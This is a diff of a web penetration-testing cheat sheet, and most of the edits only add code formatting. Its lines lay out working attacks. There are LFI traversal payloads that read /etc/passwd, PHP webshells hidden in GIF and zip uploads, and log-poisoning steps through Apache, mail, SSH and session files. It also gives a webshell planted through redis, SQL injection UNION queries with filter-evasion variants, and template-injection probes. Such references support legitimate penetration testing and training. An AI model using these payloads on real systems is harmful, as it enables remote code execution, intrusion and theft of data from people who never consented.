@@ -610,74 +610,68 @@ $language = str_replace('../', '', $_GET['file']);
 
 preg_match('/^\.\/okay\/.+$/', $_GET['file'])
 
-./okay/../../../../etc/passwd
+`./okay/../../../../etc/passwd`
 
 #### Bypass Extension PHP - Null Bytes
 
-/etc/passwd%00.php
+`/etc/passwd%00.php`
 
 -> Removing .php
   
-https://site.com/index.php?file=index.p.phphp
+`https://site.com/index.php?file=index.p.phphp`
   
 #### LFI + File Upload
 
 -> gif
 
-echo 'GIF8\<?php system($_GET["cmd"]); ?>' > ok.gif
-
+`echo 'GIF8\<?php system($_GET["cmd"]); ?>' > ok.gif'`  
 /codes/lfi/ok.gif
 
 -> Zip
 
-1- echo '\<?php system($_GET["cmd"]); ?>' > ok.php && zip ok.jpg ok.php
+1- 
+`echo '\<?php system($_GET["cmd"]); ?>' > ok.php && zip ok.jpg ok.php`
 
-2- http://ip/index.php?file=zip://./uploads/ok.jpg%23ok.php&cmd=id
-
+2- 
+`http://ip/index.php?file=zip://./uploads/ok.jpg%23ok.php&cmd=id`  
 /codes/lfi/ok.jpg
 
 #### Log Poisoning
  
 -> apache
 
-nc ip 80
+`nc ip 80`
   
-\<?php system($_GET[‘cmd’]); ?>  
+`<?php system($_GET[‘cmd’]); ?>`
   
 or
   
-curl -s http://ip/index.php -A '\<?php system($_GET[‘cmd’]); ?>'
+`curl -s http://ip/index.php -A '\<?php system($_GET[‘cmd’]); ?>'`
   
 http://ip/index.php?file=/var/log/apache2/access.log&cmd=id
   
 -> mail
 
-telnet ip 23
-  
-MAIL FROM: email@gmail.com
-  
-RCPT TO: \<?php system($_GET[‘cmd’]); ?>
-  
-http://ip/index.php?file=/var/mail/mail.log&cmd=id
+`telnet ip 23`
+`MAIL FROM: email@gmail.com`  
+`RCPT TO: \<?php system($_GET[‘cmd’]); ?>`
+`http://ip/index.php?file=/var/mail/mail.log&cmd=id`
   
 -> ssh
   
-ssh \‘<?php system($_GET[‘cmd’]);?>’@ip
+`ssh \‘<?php system($_GET[‘cmd’]);?>’@ip`
   
-http://ip/index.php?file=/var/log/auth.log&cmd=id
-  
+`http://ip/index.php?file=/var/log/auth.log&cmd=id`
+
 -> PHP session
 
-http://ip/index.php?file= \<?php system($_GET["cmd"];?>
+`http://ip/index.php?file= \<?php system($_GET["cmd"];?>`
   
-http://ip/index.php?file=/var/lib/php/sessions/sess_<your_session>&cmd=id
+`http://ip/index.php?file=/var/lib/php/sessions/sess_<your_session>&cmd=id`
   
--> Others:
-
-/var/log/sshd.log
-
-/var/log/vsftpd.log
-
+-> Other Paths  
+/var/log/sshd.log  
+/var/log/vsftpd.log  
 /proc/self/fd/0-50
   
 ### LFI - files for fuzzing
@@ -708,23 +702,23 @@ https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
 
 #### Query default:
 
-'UNION SELECT 1,name,3,4 from users; -- -
+`'UNION SELECT 1,name,3,4 from users; -- -`
 
 #### Add comment /* */ for space bypass
 
-'UNION/\*\*/SELECT/\*\*/1,name,3,4/**/from/**/users; -- -
+`'UNION/\*\*/SELECT/\*\*/1,name,3,4/**/from/**/users; -- -`
 
 #### Add comment /\*!\*/ in query for filters bypass
 
-'/\*!UNION SELECT\*/ 1,group_concat(name),3,4 from users; -- -
+`'/\*!UNION SELECT\*/ 1,group_concat(name),3,4 from users; -- -`
 
 #### Add random case
 
-'UnIoN SeLeCt 1,GrOuP_cOnCaT(nAme),3,4 FrOm users; -- -
+`'UnIoN SeLeCt 1,GrOuP_cOnCaT(nAme),3,4 FrOm users; -- -`
 
 #### Example of mix:
 
-'/\*!UnIoN/\*\*/SeLeCt/\*\*/\*/1,GroUp_ConCat(nAmE),3,4/\*\*/FrOm/\*\*/users; -- -
+`'/\*!UnIoN/\*\*/SeLeCt/\*\*/\*/1,GroUp_ConCat(nAmE),3,4/\*\*/FrOm/\*\*/users; -- -`
 
 #### Others Techniques:
 
@@ -746,12 +740,11 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 
 ### Webshell via redis
 
-`redis-cli -h ip`
-`config set dir /var/www/html`
-`config set dbfilename ok.php`
-`set test "\<?php system($_GET['okay'); ?>" `
-
-save
+`redis-cli -h ip`  
+`config set dir /var/www/html`  
+`config set dbfilename ok.php`  
+`set test "\<?php system($_GET['okay'); ?>"`  
+`save`
 
 #### Study
 
@@ -813,37 +806,39 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
   
 ### Analyze the token and perform brute-force
 
-burp intruder -> sequencer -> Token Location Within Response -> Start live capture -> save tokens
+1-  
+`burp intruder -> sequencer -> Token Location Within Response -> Start live capture -> save tokens`
 
-cat tokens.txt | uniq -c | nl 
-  
+2-  
+`cat tokens.txt | uniq -c | nl`  
+
 ## SSTI
 
 ### Identify
 
 -> Jinja2 or Twig
   
-{{3*3}}
+`{{3*3}}`
 
 -> Smarty or Mako
   
-{3*3}
+`{3*3}`
 
 -> ERB(Ruby)
   
-<%= 7*7 %>
+`<%= 7*7 %>`
 
 -> FreeMarker
   
-#{3*3}
+`#{3*3}`
 
 -> Others 
     
-${3*3}
+`${3*3}`
   
-${{3*3}}
+`${{3*3}}`
 
-3*3
+`3*3`
 
 ### Java Expression Language
 
